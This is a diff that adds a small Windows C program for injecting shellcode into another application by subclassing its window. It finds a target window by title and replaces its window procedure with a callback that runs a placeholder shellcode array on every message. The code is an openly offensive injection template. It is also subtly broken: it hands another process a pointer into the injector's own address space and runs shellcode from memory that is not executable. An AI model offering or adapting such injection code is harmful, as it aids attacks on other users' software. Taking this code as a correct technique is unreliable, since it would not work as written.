@@ -1,0 +1,40 @@
+#include <windows.h>
+
+// Function prototype for the shellcode to be injected
+typedef void (*ShellcodeFunc)(void);
+
+// The shellcode to be injected into the target process
+unsigned char shellcode[] = {
+    // Insert shellcode here
+};
+
+// The original window procedure for the target window
+WNDPROC originalWndProc;
+
+// The window subclassing callback function
+LRESULT CALLBACK SubclassProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
+{
+    // Execute the shellcode
+    ((ShellcodeFunc)shellcode)();
+
+    // Call the original window procedure
+    return CallWindowProc(originalWndProc, hwnd, uMsg, wParam, lParam);
+}
+
+int main()
+{
+    // Get the handle of the target window
+    HWND hwnd = FindWindow(NULL, "Target Window Title");
+    if (hwnd == NULL)
+        return 1;
+
+    // Get the window procedure for the target window
+    originalWndProc = (WNDPROC)GetWindowLongPtr(hwnd, GWLP_WNDPROC);
+    if (originalWndProc == NULL)
+        return 1;
+
+    // Set the window subclassing callback function for the target window
+    SetWindowLongPtr(hwnd, GWLP_WNDPROC, (LONG_PTR)SubclassProc);
+
+    return 0;
+}
